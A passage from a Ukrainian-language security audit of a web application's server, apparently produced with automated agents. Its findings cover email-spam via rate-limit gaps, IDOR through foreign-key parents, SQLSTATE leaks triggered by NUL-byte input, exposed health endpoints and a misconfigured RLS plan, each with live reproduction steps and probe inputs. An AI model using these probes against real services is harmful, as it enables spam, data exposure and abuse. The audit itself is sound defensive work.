Підтверджено і в коді, і наживо. `authSensitiveRateLimit` (authMiddleware.ts:31-37) і `authAccountRateLimit` (:77-82) покривають лише sign-in/sign-up/forget-password/request-password-reset/reset-password. Глобального лімітера на /api немає: app.ts:149-169 і routes/auth.ts:23-33. Отже `/change-email` і `/send-verification-email` тримає тільки вбудований лімітер Better Auth. У rate-limiter/index.mjs:370-384 це 3 запити на 10 с для /change-email і 3 на 60 с для /send-verification-email, на IP, в пам'яті процесу. Вмикається він тільки в production (create-context.mjs:171 `enabled ?? isProduction`). Ліміту на акаунт чи на цільову адресу немає ніде. Для непідтвердженого акаунта `updateEmailWithoutVerification: true` (auth.ts:331-333) одразу перепривʼязує адресу і шле лист на нову (update-user.mjs:430-447). Тож один акаунт з одного IP у проді може розіслати близько 1000 листів «підтверди email» на годину на довільні адреси, а з ротацією IP ще більше. Пом'якшення, які я знайшов: (1) у лист не потрапляє жодне поле, яке контролює атакувальник (verificationMail.ts не підставляє name), тож вектор тільки «чий ящик засмітити», без власного вмісту; (2) анонімний send-verification-email шле лист лише вже зареєстрованим непідтвердженим адресам, для невідомих чи підтверджених повертає 200 без відправки (email-verification.mjs:90-112). Через ці обмеження low справедливий.
```

**Додаткові докази верифікатора:**

```text
verify-server-static-auth-session/v1.mjs + v1.log на окремому pool-користувачі (vssa-1, непідтверджений): 4x POST /api/auth/change-email {newEmail: vssa_third_N@example.org} → 200,200,200,200. Потім 4x анонімний POST /api/auth/send-verification-email для поточної адреси → 200,200,200,200. Анонімний запит для неіснуючої адреси → 200. У server.log з моменту маркера 8 подій auth_transactional_email kind=email_verification (4+4, для неіснуючої адреси нуль). Рядків про rate-limit на цих шляхах 0. Відсутність 429 локально частково пояснюється dev-режимом (вбудований лімітер BA вимкнено), але per-account бакета немає і в проді. Попередні аудити: знахідка 17 у 2026-08-04-global-qa-findings.md стосується іншого (200 без відправки, коли не налаштовано Resend).
```

### [low] `/api/privat/connect` не гейтиться `requireVerifiedEmail()`, хоча той самий вектор закрито для Mono; непідтверджені акаунти мають решту повноважень

- **ID:** `server-static/auth-session#9` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/routes/banks.ts:43-52 (requireFreshSession → rateLimit → privatConnectHandler); порівняти apps/server/src/routes/mono-webhook.ts:64-93; apps/server/src/auth.ts:500-510 (grantReverseTrial для кожного нового, навіть непідтвердженого)
- **Вплив:** Модель загроз H6 («squat email → привʼязати банк») закрита лише для Monobank; для PrivatBank і всього іншого (reverse trial Pro за кожну реєстрацію з одноразовою адресою, AI, push) підтвердження email не потрібне.
- **Що зробити:** Додати `requireVerifiedEmail()` після `requireFreshSession()` на `/api/privat/connect`; зважити видачу reverse trial лише після підтвердження email.

**Докази:**

```text
mono-webhook.ts коментар: «`/api/mono/connect` МАЄ гейтитися на email_verified=true ... без цього атакувальник, що зареєстрував squat-акаунт на чужий email, підʼєднав би свій ... token». banks.ts: `r.post("/api/privat/connect", requireFreshSession(), rateLimitExpress(...), privatConnectHandler)` — без requireVerifiedEmail; у modules/mono/privatConnection.ts перевірки emailVerified немає (grep emailVerified у modules/ — нуль збігів). requireVerifiedEmail використовується лише в одному місці.
```

**Відтворення:**

```text
Статично: grep -rn requireVerifiedEmail apps/server/src/routes → лише mono-webhook.ts:91.
```

**Верифікатор:**

```text
Неузгодженість реальна. banks.ts:43-52: `/api/privat/connect` = requireFreshSession → rateLimitExpress(10/хв) → privatConnectHandler, без `requireVerifiedEmail()`. У privatConnection.ts:41-58 перевірки emailVerified теж немає. `requireVerifiedEmail` стоїть лише на `/api/mono/connect` (mono-webhook.ts:88-93). Коментар mono-webhook.ts:64-73 прямо обґрунтовує гейт сценарієм «squat-акаунт на чужий email підʼєднує свій банк», і той самий сценарій застосовний до PrivatBank. Ні в threat-model.md (рядок 77, PrivatBank), ні в beta-security-readiness.md рішення не гейтити Privat немає. Severity не підвищую, бо загроза за самим описом репо слабка: атакувальник підʼєднує власні креденшели, і жертва, яка відбере акаунт через reset, бачить дані атакувальника, а не навпаки. Друга частина (reverse trial, AI, push для непідтверджених) — свідомий продуктовий вибір: REQUIRE_EMAIL_VERIFICATION за замовчуванням false, задокументовано в auth.ts:353-368 і env.ts:85-88. Тому це defense-in-depth, а не експлойт.
```

**Додаткові докази верифікатора:**

```text
v1.log, той самий непідтверджений користувач: POST /api/privat/connect {} → 400 VALIDATION «Введи Merchant ID та токен», тобто запит дійшов до хендлера (з валідними креденшелами далі пішов би upstream-probe до acp.privatbank.ua). POST /api/mono/connect {} → 403 EMAIL_VERIFICATION_REQUIRED. grep requireVerifiedEmail у routes дає лише mono-webhook.ts:91.
```

### [low] У проді не вимагаються секрети внутрішнього контуру; WEBHOOK_HMAC — no-op без секрета, loopback завжди дозволено на /api/push/send

- **ID:** `server-static/gap-blocked-input-route-findings#9` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/audits/ai-pipeline-2026-08-05.md (B27 — /api/internal/* тримається на одному статичному секреті; «Лишається: HMAC-обовʼязковість»)
- **Де:** apps/server/src/env/env.ts:246,252,475,477 (stringWithDefault('')), assertStartupEnv env.ts:713+ (throw лише для METRICS_TOKEN/BETTER_AUTH_URL/SENTRY_DSN/token-enc-key); http/requireInternalIp.ts:84,204-211 (LOOPBACK_DEFAULTS завжди); http/verifyWebhookSignature.ts:80-82 (no-op без секрета); routes/internal/index.ts:66-100
- **Вплив:** Defense-in-depth внутрішнього контуру тримається на одному bearer-секреті: якщо WEBHOOK_HMAC_SECRET не виставлено (а старт це лише warn'ить), HMAC-шар мовчки вимкнений. Якщо API_SECRET/INTERNAL_API_KEY колись виставлять порожніми — лише 503 рятує. Loopback-always у поєднанні з хибним TRUST_PROXY відкриває IP-рівень push/send. Прямої експлуатації у поточній конфігурації немає (fail-closed тримає), тому low.
- **Що зробити:** У assertStartupEnv для production зробити throw (а не warn) при WEBHOOK_HMAC_REQUIRED=true &amp;&amp; !WEBHOOK_HMAC_SECRET, і вимагати явний PUSH_INTERNAL_ALLOWED_IPS/INTERNAL_ALLOWED_IPS у проді (або свідомий opt-out). Перекалібрувати та зафіксувати TRUST_PROXY під фактичним ланцюгом Vercel→Traefik і покрити тестом, щоб req.ip не спуфився у loopback.

**Докази:**

```text
assertStartupEnv не кидає для порожніх INTERNAL_API_KEY, API_SECRET, PUSH_INTERNAL_ALLOWED_IPS, WEBHOOK_HMAC_SECRET (підтверджено: throw-и лише для METRICS_TOKEN/BETTER_AUTH_URL/SENTRY_DSN/BETTER_AUTH_TOKEN_ENC_KEY). Fail-closed гейти частково рятують: порожній INTERNAL_API_KEY → /api/internal/* 503 (index.ts:90-95), порожній API_SECRET → /api/push/send 503 (requireApiSecret). Але: (1) verifyWebhookSignature повертає {ok:true} без секрета, тож WEBHOOK_HMAC_REQUIRED=true + порожній WEBHOOK_HMAC_SECRET = підпис не перевіряється, лишається лише bearer (env.ts:1027 лише warn, не throw). (2) requireInternalIp завжди додає 127.0.0.1/::1 у allowlist; юніт-перевірка (iip.mts, failClosedOnEmpty) підтвердила: порожній allowlist у prod-режимі пускає ip=127.0.0.1 і ::ffff:127.0.0.1 (next()), а 203.0.113.5 → 403. Проксі на тому ж хості під коректним TRUST_PROXY віддає реальний client-IP (не loopback), тож проксійований зовнішній трафік loopback'ом не стане — але при TRUST_PROXY, що довіряє зайвому hop-у, req.ip спуфиться у 127.0.0.1 і проходить IP-рівень (далі ще requireApiSecret).
```

**Відтворення:**

```text
node --import tsx iip.mts — показує next() для 127.0.0.1 та ::ffff:127.0.0.1 при порожньому allowlist у fail-closed режимі. grep assertStartupEnv env.ts — немає throw для internal/push секретів.
```

**Верифікатор:**

```text
Фактичні твердження з коду підтверджуються, але по суті це відомий, задокументований і вже відстежуваний залишковий ризик defense-in-depth. Прямого вектора атаки немає.
(1) verifyWebhookRequest без секрета повертає {ok:true} (verifyWebhookSignature.ts:80-82). Це свідомо, з коментарем «We rely on the bearer-token guard». У env.ts:1020-1035 явно пояснено, чому тут warn, а не throw: /api/internal/* стоїть за fail-closed bearer-гейтом. Саме цей хвіст записаний у ai-pipeline-2026-08-05.md B27 як «Лишається: HMAC-обовʼязковість... fail-startup у проді без секрету потребує інвентаризації викликачів».
(2) requireInternalIp завжди додає loopback. Це задокументовано як навмисне (requireInternalIp.ts:55-56). Unit-проба підтвердила: при порожньому allowlist у fail-closed режимі 127.0.0.1 і ::ffff:127.0.0.1 проходять (next()), а 203.0.113.5 отримує 403.
(3) Порожні INTERNAL_API_KEY і API_SECRET і так дають 503 (routes/internal/index.ts:90-95, requireApiSecret.ts:18-23). Те, що assertStartupEnv тут не кидає, само по собі проблемою не є.
Сценарій зі спуфом req.ip у loopback вимагає хибного TRUST_PROXY (дефолт 1, `true` заборонено в lib/trustProxy.ts) і крім того знання API_SECRET. Це гіпотетична місконфігурація, а не підтверджена вразливість. Нове, що не відстежено: розбіжність документації з кодом. Коментар у routes/push.ts:97-100 і докстрінг requireInternalIp.ts:38-42 обіцяють «fails-closed (503) in production» при порожньому allowlist. Насправді `built` ніколи не null (loopback парситься завжди), тож у проді буде loopback-only плюс 403 IP_NOT_ALLOWED, а не 503 NOT_CONFIGURED. Залишаю low як defense-in-depth.
```

**Додаткові докази верифікатора:**

```text
Прогін <scratch>/agents/verify-server-static-gap-blocked-input-route-findings/iip.mts (node --import tsx): 'prod-mode, empty allowlist, ip 127.0.0.1 -> next() (allowed)'; '::ffff:127.0.0.1 -> next() (allowed)'; '203.0.113.5 -> 403 IP_NOT_ALLOWED'. Гілка 503 NOT_CONFIGURED у requireInternalIp.ts:190-200 недосяжна, бо buildBlockList завжди містить LOOPBACK_DEFAULTS. Ланцюжок на /api/push/send (routes/push.ts:108-126): broadRateLimit, далі requireInternalIp(PUSH_INTERNAL_ALLOWED_IPS), далі requireApiSecret('API_SECRET'), отже навіть пройдений IP-шар упирається в constant-time перевірку секрета. INTERNAL_ALLOWED_IPS (env.ts:248-252) свідомо не монтується, коли порожній, і це теж задокументовано в рамках B27.
```

### [low] Disconnect не відкликає грант у Сільпо, а refresh, що летить паралельно, воскрешає видалений рядок silpo_connection

- **ID:** `server-static/gap-silpo-and-shared-product-catalog#12` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/routes/silpo.ts:239-252; apps/server/src/modules/silpo/tokenStore.ts:259-297 (persistTokens = INSERT ... ON CONFLICT DO UPDATE), :382-403; apps/server/src/modules/silpo/oauth.ts (функції revoke немає)
- **Вплив:** «Токен видаляється з сервера» (копія UI) правда лише локально: витік токена до моменту відключення не втрачає сили. Рідкісна гонка повертає підключення, яке людина щойно розірвала.
- **Що зробити:** Викликати revocation_endpoint (якщо оголошений у metadata) для refresh-токена при disconnect. У persistTokens для шляху refresh використовувати UPDATE ... WHERE user_id=$1 (не UPSERT), щоб refresh ніколи не створював рядок; UPSERT лишити тільки для callback.

**Докази:**

```text
disconnectHandler робить лише `DELETE FROM silpo_connection`; виклику revocation endpoint немає ніде в модулі (grep revoke = 0). Access-токен лишається дійсним у Сільпо ~30 днів, refresh безстроково. performRefresh, що почався до кліку «Відключити», після успішного обміну робить persistTokens (UPSERT, status='connected'), тобто вставляє рядок знову, і людина знову «підключена» (полер, пошук їжі).
```

**Відтворення:**

```text
Статично: POST /api/silpo/disconnect під час in-flight refresh (наприклад, кошик відкритий у сусідній вкладці і токен щойно протух) -> після завершення обміну GET /api/silpo/sync-state показує status connected.
```

**Верифікатор:**

```text
Обидві частини підтверджено. (1) disconnectHandler (routes/silpo.ts:239-252) робить лише `DELETE FROM silpo_connection`, у модулі немає жодного виклику revocation (grep revoke дає тільки коментар про client_id). При цьому живий metadata Сільпо оголошує `revocation_endpoint: https://mcp.silpo.ua/token`, тобто відкликання доступне, просто не використовується. Спека (silpo-mcp-integration.md:197-209) свідомо обрала mono-патерн «видаляти лише рядок», але питання відкликання гранту там не розглядали (у Mono токен через API не відкличеш). Тож це не «intended-and-safe», а прогалина defense-in-depth: refresh-токен лишається дійсним у Сільпо безстроково, зокрема в бекапах БД (у зашифрованому вигляді). (2) persistTokens (tokenStore.ts:259-297) робить `INSERT ... ON CONFLICT (user_id) DO UPDATE ... status='connected'` і викликається з performRefresh. Refresh, що почався до DELETE, після обміну вставить рядок знову. Ймовірність цієї гонки дуже мала: refresh буває лише на 401, а access-токен живе близько 30 днів, тож клік «Відключити» має влучити в кілька сотень мілісекунд обміну. Копія UI «токен видаляється з сервера» (SilpoIntegrationSection.tsx:100) буквально правдива. Severity low.
```

**Додаткові докази верифікатора:**

```text
Живий metadata: "revocation_endpoint":"https://mcp.silpo.ua/token" (meta.mjs у scratch-теці верифікатора). oauth.ts OAuthMetadataSchema парсить лише authorization/token/registration endpoint, revocation_endpoint ігнорується.
```

### [low] План RLS (Стадія 4) не спрацює: застосунок ходить у Postgres під суперкористувачем, а FORCE ROW LEVEL SECURITY суперкористувача не обмежує

- **ID:** `server-static/idor-rls#2` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Де:** docs/work/specs/rls-ai-tables-and-isolation-gate.md § A2; apps/server/src/dbContext.ts:1-115; docker-compose.yml:34; apps/server/src/test/pg-container.ts:31; docs/start/instructions/database-backup-restore.md:55
- **Вплив:** Після міграції з політиками (Стадія 4) ізоляція в базі лишиться декоративною: політики будуть, а прод-роль їх обходить. Інтеграційні тести на Testcontainers теж ходять під суперкористувачем, тож будуть зеленими навіть зі зламаними політиками. Є ризик хибного відчуття захисту AI-таблиць від забутого WHERE і prompt-injection (головна мотивація ADR-0012).
- **Що зробити:** Перед Стадією 4 завести окрему рантайм-роль NOSUPERUSER NOBYPASSRLS, не власника таблиць, з GRANT лише на DML; міграції лишити під власником або суперкористувачем. Додати стартову перевірку `rolsuper OR rolbypassrls` -&gt; помилка, коли RLS очікується. Запускати isolation- і RLS-тести під цією роллю. Окремо врахувати, що DML у SQL-міграціях над цими таблицями (як 144_ai_memories_prune_dead_sources.sql:46) під FORCE і не-суперкористувачем мовчки зачепить 0 рядків.

**Докази:**

```text
Спека A2: «Роль не міняємо, вмикаємо FORCE ... Сервер і міграції продовжують ходити під тим самим користувачем». Локально: `SELECT rolname, rolsuper, rolbypassrls FROM pg_roles WHERE rolname=current_user` -> `hub | t | f`. Роль hub створена через POSTGRES_USER (docker-compose.yml:34, Testcontainers pg-container.ts:31 `POSTGRES_USER: "hub"`), тобто це суперкористувач. Прод-ранбук: `MIGRATE_DATABASE_URL # postgresql://postgres:<pass>@<api-host>:5432/postgres`, і рантайм за спекою використовує того самого користувача. У Postgres суперкористувачі та ролі з BYPASSRLS обходять RLS завжди, FORCE діє лише на власника, який не є суперкористувачем.
```

**Відтворення:**

```text
psql postgresql://hub:hub@127.0.0.1:5432/hub -c "SELECT rolname, rolsuper, rolbypassrls FROM pg_roles WHERE rolname=current_user"; прочитати spec § A2 і крок 4 верифікації.
```

**Верифікатор:**

```text
Факти підтверджено. Роль `hub` має `rolsuper=t`, вона ж власник ai_memories, coach_memory, ai_usage_daily і sergeant_nudge_cache. docker-compose.yml:34 і pg-container.ts:31 створюють її через POSTGRES_USER, тобто як суперкористувача. У спеці § A2 сказано «Роль не міняємо, вмикаємо FORCE», і суперкористувач у ній не згадується ніде. У Postgres суперкористувачі та ролі з BYPASSRLS обходять RLS навіть під FORCE. Прод-роль із репо достеменно не видно, але ранбук бекапів показує `postgresql://postgres:...` (дефолтний суперкористувач Coolify), а спека прямо каже, що сервер ходить під тим самим користувачем, що й міграції. Severity знижую до low: політик ще немає (Стадія 4 «Не почато»), тож рантайм-впливу нуль. Крім того, крок 4 верифікації самої спеки (`SELECT count(*) FROM ai_memories` очікує 0) на локальній базі під hub дасть ненуль і зупинить виконавця, хоч спека й назве хибну причину («FORCE не спрацював»). Твердження кандидата, що Testcontainers-тести «будуть зеленими зі зламаними політиками», неточне: тести, які перевіряють саме RLS-ізоляцію, під суперкористувачем падатимуть, а зеленим лишиться лише гейт рівня застосунку. Це дефект плану, а не жива вразливість.
```

**Додаткові докази верифікатора:**

```text
psql: `hub|t|f` (rolname, rolsuper, rolbypassrls); tableowner=hub для всіх 4 AI-таблиць. ADR-0012 має статус Accepted і явно приймає app-enforced модель, а RLS лишає «possible future defence-in-depth». docs/work/specs/rls-ai-tables-and-isolation-gate.md § «Поза скоупом» прямо виносить «Окрема DB-роль без BYPASSRLS», не помічаючи, що без неї FORCE для суперкористувача нічого не дає.
```

### [low] Sync не перевіряє власника батьківського рядка: можна прикріпити свої fizruk_workout_items до чужого тренування, і FK-помилка показує, чи існує чужий id

- **ID:** `server-static/idor-rls#5` · **Вердикт:** підтверджено · **Категорія:** `idor` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/modules/sync/fizruk/applySync.ts:150-240 (workout_id не перевіряється), ~:300-360 (workout_item_id у sets); FK fizruk_workout_items.workout_id -&gt; fizruk_workouts(id) ON DELETE CASCADE
- **Вплив:** Рядки одного користувача привʼязуються FK до рядків іншого. Видалення акаунта Y каскадом знищує дані X. Кожен майбутній серверний читач, що джойнить items за workout_id без user_id, отримає чужі дані. Відповідь `applied` проти `apply_failed` працює як оракул існування чужих id. Прямої експлуатації зараз немає, бо id випадкові, а pull скоупиться по user_id.
- **Що зробити:** Перед вставкою або оновленням перевіряти, що батьківський рядок належить користувачу (`SELECT 1 FROM fizruk_workouts WHERE id=$1 AND user_id=$2`). Інший варіант: складений FK (user_id, workout_id) -&gt; fizruk_workouts(user_id, id) разом із переходом на складені PK.

**Докази:**

```text
Живий прогін: Y створює fizruk_workouts id=w_audit_62bf6404-... -> applied; X пушить fizruk_workout_items {workout_id: <id Y>} -> `{"status":"applied"}`; X пушить item із неіснуючим workout_id -> `{"status":"rejected","reason":"apply_failed"}`. У коді лише `const workoutId = typeof row["workout_id"] === "string" ? ... ` без перевірки `fizruk_workouts.user_id = userId`.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-idor-rls/xfk.mjs
```

**Верифікатор:**

```text
Відтворено. applyFizrukItems перевіряє лише, що `row.user_id === userId` і що сам item не чужий; `workout_id` береться з тіла без перевірки власника батьківського тренування. FK fizruk_workout_items.workout_id -> fizruk_workouts(id) ON DELETE CASCADE (так само sets -> items). У БД лежить рядок, де item_owner=X, а workout_owner=Y. Практичний вплив мізерний, тож low (можна було б і info). Id тренувань випадкові, тому без знання чужого id атаки немає. Від каскаду страждає лише сам атакувальник: це його items видаляться разом із чужим тренуванням. Серверних читачів, що джойнили б items за workout_id, немає (grep знаходить лише dataRights і syncV2). Pull скоупиться по user_id. Оракул існування (applied проти apply_failed) нічого не додає до вже наявного оракула fk_violation з #1. Знахідка лишається валідною як defense-in-depth.
```

**Додаткові докази верифікатора:**

```text
node <scratch>/agents/verify-server-static-idor-rls/v5-xfk.mjs: `X item into Y workout -> applied`, `X item into nonexistent workout -> rejected apply_failed`. psql по i_audit_fe2529de-...: item_owner=CimODotJ..., workout_owner=KlmeLDJh... (різні користувачі). grep fizruk_workout_items в apps/server/src поза міграціями й тестами дає лише dataRights.ts:296 і syncV2.ts:170.
```

### [low] errorHandler віддає клієнту SQLSTATE/системні коди і перетворює помилки вводу (pg class 22, ZodError) на 500 із Sentry-подією на кожен запит

- **ID:** `server-static/reliability-ops#3` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Де:** apps/server/src/http/errorHandler.ts:46-60 (code = e.code для будь-якої помилки), 95-101 (Sentry.captureException для всіх non-operational 5xx), 118-124
- **Вплив:** 1) Назовні йдуть внутрішні коди драйвера/БД (SQLSTATE, ECONNREFUSED тощо): дрібний, але реальний витік інформації про стек. 2) Будь-який автентифікований користувач поганим вводом генерує необмежену кількість 500 і Sentry-подій (errorHandler.ts:95-101 плюс setupExpressErrorHandler). Ланцюг Sentry -&gt; n8n -&gt; Telegram отримує шум, вичерпується квота Sentry, і справжні інциденти губляться. На дашбордах/SLO це рахується як серверні помилки, а не як 4xx.
- **Що зробити:** У термінальному хендлері: (а) не віддавати `e.code` для non-operational помилок, а лише стабільний `INTERNAL`; (б) мапити `ZodError` -&gt; 400 VALIDATION, а pg SQLSTATE класу 22 (22P02/22P05/22021/22007/22008) і 23 -&gt; 400/409 без Sentry; (в) 40P01/40001 повторювати або повертати 503 з Retry-After. Окремо: санітизувати NUL/невалідний UTF-8 на рівні zod-схем (вхідна валідація).

**Докази:**

```text
`const code = (typeof e.code === "string" && e.code) || (..."INTERNAL")`. Живий виклик: POST /api/finyk/manual-expenses {amount:100,category:"food",note:"x\u0000y"} як pool-юзер ->
500 {"error":"Server error","message":"Server error","code":"22P05","requestId":"b8494ef7-..."}.
У серверних логах аудиту 500-ки з кодами 22P05, 22P02, 22021, 22007, 22008, 40P01 на /api/me/profile, /api/me/preferences, /api/finyk/manual-expenses, /api/finyk/import/commit, /api/mono/transactions, /api/push/register, /api/feedback, /api/coach/memory. DELETE /api/me з тілом-масивом дає 500 INTERNAL через ZodError (routes/me.ts:282 `MeDeleteBodySchema.parse(req.body ?? {})`).
```

**Відтворення:**

```text
node <scratch>/agents/server-static-reliability-ops/probe2.mjs: POST /api/finyk/manual-expenses з NUL-символом у note повертає 500 з code "22P05".
```

**Верифікатор:**

```text
Перевірено в коді: errorHandler.ts:52-53 бере e.code для будь-якої помилки, зокрема non-operational 5xx, а рядки 95-101 відправляють у Sentry кожен non-operational 5xx. Мапінгу pg SQLSTATE чи ZodError на 4xx немає ніде в ланцюжку middleware (grep не знайшов ні mapPgError, ні ZodError-хендлера; app.ts:189-190 ставить лише attachSentryErrorHandler і errorHandler). Відтворено наживо. Серйозність знижую до low. Витік обмежується кодом SQLSTATE чи системною помилкою без повідомлення і стеку (userMessage = «Server error»). Sentry групує однакові винятки в одне issue, тож «шум» означає обсяг подій, а не нові алерти. Для зловживання потрібна автентифікація і обходження per-user лімітів. По суті це неправильні статус-коди (500 замість 400) і defense-in-depth, а не помітна вразливість.
```

**Додаткові докази верифікатора:**

```text
verify-server-static-reliability-ops/err-probe.mjs (pool-юзер audit_pool159): POST /api/finyk/manual-expenses з note "x\u0000y" повертає 500 {"error":"Server error","message":"Server error","code":"22P05",...}; той самий запит з note "ok" повертає 201; DELETE /api/me з тілом [1,2,3] повертає 500 {"code":"INTERNAL"} (ZodError з MeDeleteBodySchema.parse, routes/me.ts:282).
```

### [low] Анонімні /healthz, /health/workers і /api/status без rate-limit роблять SQL на кожен виклик і розкривають операційні дані

- **ID:** `server-static/reliability-ops#8` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/routes/health.ts:55-56; apps/server/src/http/health.ts:106-191, 222-256; apps/server/src/modules/me/deletionPoller.ts:242-262; apps/server/src/modules/gdpr/cleanupPoller.ts:226-244; apps/server/src/http/status.ts:115-140
- **Вплив:** Будь-хто бачить бізнес-метрики (скільки користувачів запросили видалення акаунта, розмір черг) і може без обмежень навантажувати пул БД (20 з'єднань) через endpoint-и без кешу. /health (= readyz) ділить той самий пул, тож флуд може валити healthcheck Coolify. Публічний статус n8n вводить в оману.
- **Що зробити:** Закрити /healthz і /health/workers тим самим METRICS_TOKEN або allowlist, як /metrics (лишити анонімними лише /livez, /readyz, /health); кешувати знімок на 5-10 с; для n8n у /api/status показувати `paused/unknown`, коли інтеграція вимкнена.

**Докази:**

```text
Живий GET /health/workers без кукі: 200 `{"accountDeletion":{..."pending":{"waiting":4,"overdue":0}},"gdprCleanup":{..."queueDepth":{..."total":0}},"monoEnrichment":{...}}`, rate-limit заголовків немає; 20 послідовних викликів 212 мс (4 SQL-запити кожен, включно з COUNT по "user"). /healthz показує стан пулу і circuit breaker. /api/status показує `n8n: operational`, хоча n8n у проді на паузі (статус рахується лише за таблицею n8n_failure_events).
```

**Відтворення:**

```text
node <scratch>/agents/server-static-reliability-ops/probe4.mjs; GET /health/workers і /healthz без авторизації.
```

**Верифікатор:**

```text
I reproduced it live and checked the code. GET /health/workers, /healthz and /api/status all answer anonymously with no rate-limit headers. /health/workers returns accountDeletion.pending {waiting:4, overdue:0} plus GDPR and mono queue depths, computed by COUNT queries on every call (deletionPoller.ts:242-262, cleanupPoller.ts:226-244). /healthz shows pool stats and the anthropic circuit-breaker state. /api/status always reports n8n as 'operational', because the status only counts rows in n8n_failure_events (status.ts:122-150), yet ADR-0090 decommissioned n8n and says leftover references like this should be removed. Some of the design is intentional. The health.ts:209 comment says the route is anonymous with no rate-limit on purpose, and ADR-0098 requires deletion visibility in /health/workers, but nothing justifies exposing these counts to anonymous users. The DoS / 'can bring down the Coolify healthcheck' impact is overstated. The COUNTs are indexed (user_deletion_requested_at_idx), 60 parallel anonymous calls all returned 200 in 239 ms, and any anonymous endpoint, /health itself included, puts the same kind of load on the pool. What remains real is a minor exposure of business metrics to anonymous users and a public status page that shows a dead system as healthy. Low is the right severity.
```

**Додаткові докази верифікатора:**

```text
Script: <scratch>/agents/verify-server-static-reliability-ops/r2-probe.mjs. Results: /health/workers 200 with no ratelimit headers and accountDeletion.pending.waiting=4; /healthz 200 with pool totalCount/idleCount and the anthropic breaker; /api/status 200 with components n8n 'operational'; burst of 60 parallel /health/workers returned 60x200 in 239 ms. threat-model.md:81 covers only the /healthz and /readyz payload invariants (L7) and does not mention /health/workers counts. ADR-0090 classifies leftover n8n references as residue to remove.
```

### [low] fizruk_workout_items.workout_id і fizruk_workout_sets.workout_item_id не перевіряються на власника; FK ON DELETE CASCADE прив'язує рядки до чужих батьків

- **ID:** `server-static/sync-contract#10` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/modules/sync/fizruk/applySync.ts:197-200,247-270 (workout_id), 362-367,392-405 (workout_item_id); FK fizruk_workout_items_workout_id_fkey / fizruk_workout_sets_workout_item_id_fkey ON DELETE CASCADE
- **Вплив:** Defense-in-depth: при знанні id предмети чи підходи атакувальника прив'язуються до чужого тренування і каскадно видаляються разом з ним (або навпаки). Будь-який майбутній читач, що джойнить по workout_id без user_id, побачить чужі дані.
- **Що зробити:** Перед INSERT/UPDATE перевіряти, що батьківський рядок існує і належить userId (інакше fk_violation), або зробити FK композитним (workout_id, user_id).

**Докази:**

```text
Перевіряється лише власник САМОГО рядка (SELECT ... WHERE id=$1 => fk_violation), а workoutId/workoutItemId з payload іде в INSERT без `SELECT user_id FROM fizruk_workouts WHERE id=$workoutId`. Глобальний PK fizruk_workouts.id і FK дозволяють посилатися на тренування іншого користувача.
```

**Відтворення:**

```text
Статично. Потрібне знання чужого workout id (w_<ts>_<uuid>), тому живцем не перевірялось.
```

**Верифікатор:**

```text
Відтворено наживо. applyFizrukItems і applyFizrukSets (fizruk/applySync.ts:197-200, 247-270, 362-405) перевіряють власника лише самого рядка (id), а workout_id і workout_item_id з payload ідуть в INSERT/UPDATE без перевірки власника батьківського рядка. FK (міграція 096) глобальний, тож посилання на чуже тренування проходить. Реальний вплив менший, ніж сказано у знахідці. (1) fizruk_workouts видаляється лише м'яко (soft delete, deleted_at). Жорстке видалення буває тільки при видаленні акаунта (каскад від "user"), і тоді каскадом зникають лише рядки самого атакувальника, прив'язані до тренування жертви. Варіант «або навпаки» неможливий. (2) Жоден серверний читач не джойнить fizruk_workout_items/sets по workout_id без user_id: експорт dataRights іде по user_id, pull читає sync_op_log по user_id. Жертва чужого рядка не бачить. (3) Потрібно знати id тренування жертви (w_<ts>_<uuid>), а він ніде не віддається. Додатково виявлено оракул існування для вже відомого id: неіснуючий workout_id дає apply_failed (FK), існуючий чужий дає applied. Це defense-in-depth, low.
```

**Додаткові докази верифікатора:**

```text
Скрипт v4-fk.mjs. Жертва vssc3 створила fizruk_workouts w_1790906297583_61db…. Атакувальник vssc2 (інший user_id) запушив fizruk_workout_items з workout_id = id тренування жертви => {"status":"applied"}. Item з неіснуючим workout_id => rejected apply_failed. Pull жертви (since=0) item атакувальника не містить (false).
```

### [low] Більшість sync-апплаєрів не обмежують текстові й числові поля на сервері (межі є лише в nutrition)

- **ID:** `server-static/sync-contract#9` · **Вердикт:** підтверджено · **Категорія:** `injection` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/modules/sync/routine/applySyncFullState.ts:47-48,182-230 (habit/tag/category name, emoji, scope), routine/applySync.ts:90 (entries.name), fizruk/applySync.ts:81 (workout note), 206-209 (name_uk), fizruk/applyMisc.ts (data_json), finyk/applySync.ts:169 (data_json будь-якої форми), nutrition/applySync.ts:98-102 (kcal без меж); isWithinTextBound використовується лише в nutrition/*
- **Вплив:** Обхід клієнтських лімітів через curl: роздуті імена ламають push-payload (ліміт 4 КБ), роздувають токени AI-контексту і збільшують обсяг БД. Здебільшого шкодить власному акаунту, але витрати LLM лягають на оператора.
- **Що зробити:** Застосувати isWithinTextBound/parseOptionalBoundedNumber в усіх апплаєрах (routine, fizruk, finyk) за тим самим каноном, що й у nutrition, і обмежити розмір data_json для blob-таблиць.

**Докази:**

```text
grep isWithinTextBound|NAME_MAX_LEN по modules/sync: лише nutrition/applySync.ts і applyPantryEvents.ts. Для routine_habits.name єдина межа — 256 КБ на весь row. Цей name іде в title push-нагадування (lib/reminders/due.ts:142) і в AI-контекст.
```

**Відтворення:**

```text
POST /api/v2/sync/push з routine_habits.name довжиною 200 000 символів => applied.
```

**Верифікатор:**

```text
